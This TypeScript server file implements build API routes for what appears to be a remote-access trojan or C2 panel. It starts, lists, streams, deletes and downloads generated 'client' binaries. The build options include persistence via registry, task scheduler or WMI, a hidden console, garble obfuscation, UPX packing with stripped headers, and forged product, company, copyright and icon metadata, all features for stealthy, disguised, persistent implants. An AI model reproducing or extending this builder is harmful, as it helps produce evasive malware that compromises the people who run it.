import { v4 as uuidv4 } from "uuid";
import { authenticateRequest } from "../../auth";
import { AuditAction, logAudit } from "../../auditLog";
import * as buildManager from "../../build/buildManager";
import { deleteBuild, getAllBuilds, getBuild } from "../../db";
import { requirePermission } from "../../rbac";
import { logger } from "../../logger";
import path from "path";
import fs from "fs";
import { resolveRuntimeRoot } from "../runtime-paths";

type RequestIpProvider = {
  requestIP: (req: Request) => { address?: string } | null | undefined;
};

type BuildRouteDeps = {
  startBuildProcess: (buildId: string, config: any) => Promise<void>;
  sanitizeMutex: (value?: string) => string | undefined;
  allowedPlatforms: Set<string>;
};

export async function handleBuildRoutes(
  req: Request,
  url: URL,
  server: RequestIpProvider,
  deps: BuildRouteDeps,
): Promise<Response | null> {
  if (!url.pathname.startsWith("/api/build")) {
    return null;
  }

  try {
    const user = await authenticateRequest(req);
    if (!user) {
      return new Response("Unauthorized", { status: 401 });
    }

    if (req.method === "POST" && url.pathname === "/api/build/start") {
      requirePermission(user, "clients:build");

      const body = await req.json();
      const {
        platforms,
        serverUrl,
        rawServerList,
        stripDebug,
        disableCgo,
        obfuscate,
        enablePersistence,
        persistenceMethod,
        mutex,
        disableMutex,
        hideConsole,
        noPrinting,
        outputName,
        garbleLiterals,
        garbleTiny,
        garbleSeed,
        assemblyTitle,
        assemblyProduct,
        assemblyCompany,
        assemblyVersion,
        assemblyCopyright,
        iconBase64,
        enableUpx,
        upxStripHeaders,
      } = body;

      if (!platforms || !Array.isArray(platforms) || platforms.length === 0) {
        return Response.json({ error: "No platforms specified" }, { status: 400 });
      }

      let safeMutex: string | undefined;
      try {
        safeMutex = typeof mutex === "string" ? deps.sanitizeMutex(mutex) : undefined;
      } catch (err: any) {
        return Response.json({ error: err?.message || "Invalid mutex" }, { status: 400 });
      }
      const safeDisableMutex = !!disableMutex;
      const sanitizedPlatforms = platforms.filter((p: string) => typeof p === "string");
      if (sanitizedPlatforms.length !== platforms.length) {
        return Response.json({ error: "Invalid platform entries" }, { status: 400 });
      }
      const allowedPlatforms = sanitizedPlatforms.filter((p: string) =>
        deps.allowedPlatforms.has(p),
      );
      if (allowedPlatforms.length === 0) {
        return Response.json({ error: "No valid platforms specified" }, { status: 400 });
      }

      const safeRawServerList = !!rawServerList;
      const safeServerUrl =
        typeof serverUrl === "string" && serverUrl.trim() !== ""
          ? serverUrl.trim()
          : undefined;
      if (safeRawServerList) {
        if (!safeServerUrl) {
          return Response.json(
            { error: "Raw server list requires a server URL" },
            { status: 400 },
          );
        }
        try {
          const parsed = new URL(safeServerUrl);
          if (parsed.protocol !== "https:") {
            return Response.json(
              { error: "Raw server list URL must use https" },
              { status: 400 },
            );
          }
        } catch {
          return Response.json({ error: "Invalid raw server list URL" }, { status: 400 });
        }
      }

      const buildId = uuidv4();
      const ip = server.requestIP(req)?.address || "unknown";

      logAudit({
        timestamp: Date.now(),
        username: user.username,
        ip,
        action: AuditAction.COMMAND,
        details: `Started build ${buildId} for platforms: ${allowedPlatforms.join(", ")}`,
        success: true,
      });

      const safeNoPrinting = !!noPrinting;
      const VALID_PERSISTENCE_METHODS = new Set(['startup', 'registry', 'taskscheduler', 'wmi']);
      const safePersistenceMethod =
        typeof persistenceMethod === 'string' && VALID_PERSISTENCE_METHODS.has(persistenceMethod.toLowerCase())
          ? persistenceMethod.toLowerCase()
          : 'startup';
      const safeOutputName = typeof outputName === "string" && /^[A-Za-z0-9._-]{1,64}$/.test(outputName.trim())
        ? outputName.trim()
        : undefined;
      const safeGarbleSeed = typeof garbleSeed === "string" && /^[A-Za-z0-9]{1,64}$/.test(garbleSeed.trim())
        ? garbleSeed.trim()
        : undefined;
      const safeAssemblyVersion = typeof assemblyVersion === "string" && /^\d{1,5}\.\d{1,5}\.\d{1,5}\.\d{1,5}$/.test(assemblyVersion.trim())
        ? assemblyVersion.trim()
        : undefined;
      const safeStr = (val: any, max = 128) =>
        typeof val === "string" && val.trim().length > 0 ? val.trim().slice(0, max) : undefined;
      const safeIconBase64 = typeof iconBase64 === "string" && iconBase64.length > 0 && iconBase64.length <= 2 * 1024 * 1024
        ? iconBase64
        : undefined;

      deps.startBuildProcess(buildId, {
        platforms: allowedPlatforms,
        serverUrl: safeServerUrl,
        rawServerList: safeRawServerList,
        mutex: safeMutex,
        disableMutex: safeDisableMutex,
        stripDebug,
        disableCgo,
        obfuscate: !!obfuscate,
        enablePersistence,
        persistenceMethod: safePersistenceMethod,
        hideConsole: !!hideConsole,
        noPrinting: safeNoPrinting,
        builtByUserId: user.userId,
        outputName: safeOutputName,
        garbleLiterals: !!garbleLiterals,
        garbleTiny: !!garbleTiny,
        garbleSeed: safeGarbleSeed,
        assemblyTitle: safeStr(assemblyTitle),
        assemblyProduct: safeStr(assemblyProduct),
        assemblyCompany: safeStr(assemblyCompany),
        assemblyVersion: safeAssemblyVersion,
        assemblyCopyright: safeStr(assemblyCopyright),
        iconBase64: safeIconBase64,
        enableUpx: !!enableUpx,
        upxStripHeaders: !!upxStripHeaders,
      });

      return Response.json({ buildId });
    }

    if (req.method === "GET" && url.pathname === "/api/build/list") {
      requirePermission(user, "clients:build");

      const builds = getAllBuilds(user.userId, user.role);
      return Response.json({ builds });
    }

    if (req.method === "DELETE" && url.pathname.match(/^\/api\/build\/(.+)\/delete$/)) {
      requirePermission(user, "clients:build");

      const buildId = decodeURIComponent(url.pathname.split("/")[3]);

      const build = getBuild(buildId);
      if (build?.files) {
        const rootDir = resolveRuntimeRoot();
        const outDir = path.join(rootDir, "dist-clients");
        for (const file of build.files) {
          try {
            const filePath = path.join(outDir, file.filename);
            if (fs.existsSync(filePath)) {
              fs.unlinkSync(filePath);
              logger.info(`[build:delete] Removed file: ${filePath}`);
            }
          } catch (err) {
            logger.warn(`[build:delete] Failed to remove file ${file.filename}:`, err);
          }
        }
      }

      buildManager.deleteBuildStream(buildId);
      deleteBuild(buildId);

      const ip = server.requestIP(req)?.address || "unknown";
      logAudit({
        timestamp: Date.now(),
        username: user.username,
        ip,
        action: AuditAction.COMMAND,
        details: `Deleted build ${buildId}`,
        success: true,
      });

      logger.info(`[build:delete] Build ${buildId.substring(0, 8)} deleted by ${user.username}`);
      return Response.json({ success: true });
    }

    if (req.method === "GET" && url.pathname.match(/^\/api\/build\/(.+)\/stream$/)) {
      requirePermission(user, "clients:build");

      const buildId = url.pathname.split("/")[3];
      const build = buildManager.getBuildStream(buildId);

      if (!build) {
        return Response.json({ error: "Build not found" }, { status: 404 });
      }

      logger.info(`[build:${buildId.substring(0, 8)}] Client connected to stream`);

      const stream = new ReadableStream({
        start(controller) {
          build.controllers.push(controller);
          logger.info(
            `[build:${buildId.substring(0, 8)}] Added controller, total: ${build.controllers.length}`,
          );

          const encoder = new TextEncoder();
          try {
            controller.enqueue(
              encoder.encode(
                `data: ${JSON.stringify({ type: "status", text: "Connected to build stream" })}\n\n`,
              ),
            );
          } catch (err) {
            logger.error(
              `[build:${buildId.substring(0, 8)}] Failed to send initial message:`,
              err,
            );
          }
        },
        cancel() {
          const index = build.controllers.indexOf(this as any);
          if (index > -1) {
            build.controllers.splice(index, 1);
            logger.info(
              `[build:${buildId.substring(0, 8)}] Controller removed, remaining: ${build.controllers.length}`,
            );
          }
        },
      });

      return new Response(stream, {
        headers: {
          "Content-Type": "text/event-stream",
          "Cache-Control": "no-cache",
          Connection: "keep-alive",
          "X-Accel-Buffering": "no",
        },
      });
    }

    if (req.method === "GET" && url.pathname.match(/^\/api\/build\/(.+)\/info$/)) {
      requirePermission(user, "clients:build");

      const buildId = url.pathname.split("/")[3];
      const build = buildManager.getBuildStream(buildId);

      if (!build) {
        const dbBuild = getBuild(buildId);
        if (!dbBuild) {
          return Response.json({ error: "Build not found" }, { status: 404 });
        }
        return Response.json({
          id: dbBuild.id,
          status: dbBuild.status,
          startTime: dbBuild.startTime,
          expiresAt: dbBuild.expiresAt,
          files: dbBuild.files,
        });
      }

      return Response.json({
        id: build.id,
        status: build.status,
        startTime: build.startTime,
        expiresAt: build.expiresAt,
        files: build.files,
      });
    }

    if (req.method === "GET" && url.pathname.match(/^\/api\/build\/download\//)) {
      requirePermission(user, "clients:build");

      const rawName = url.pathname.split("/api/build/download/")[1] || "";
      let fileName = rawName;
      try {
        fileName = decodeURIComponent(rawName);
      } catch {
        return Response.json({ error: "Bad request" }, { status: 400 });
      }

      if (
        !fileName ||
        fileName.includes("\u0000") ||
        fileName.includes("/") ||
        fileName.includes("\\")
      ) {
        return Response.json({ error: "File not found" }, { status: 404 });
      }

      const rootDir = resolveRuntimeRoot();
      const distRoot = path.resolve(rootDir, "dist-clients");
      const filePath = path.resolve(distRoot, fileName);
      const rootWithSep = distRoot.endsWith(path.sep)
        ? distRoot
        : `${distRoot}${path.sep}`;

      if (!filePath.startsWith(rootWithSep)) {
        return Response.json({ error: "File not found" }, { status: 404 });
      }

      const file = Bun.file(filePath);
      if (!(await file.exists())) {
        return Response.json({ error: "File not found" }, { status: 404 });
      }

      return new Response(file, {
        headers: {
          "Content-Type": "application/octet-stream",
          "Content-Disposition": `attachment; filename="${fileName}"`,
        },
      });
    }

    return new Response("Not found", { status: 404 });
  } catch (error) {
    if (error instanceof Response) {
      return error;
    }
    logger.error("[build] API error:", error);
    return Response.json({ error: "Internal server error" }, { status: 500 });
  }
}
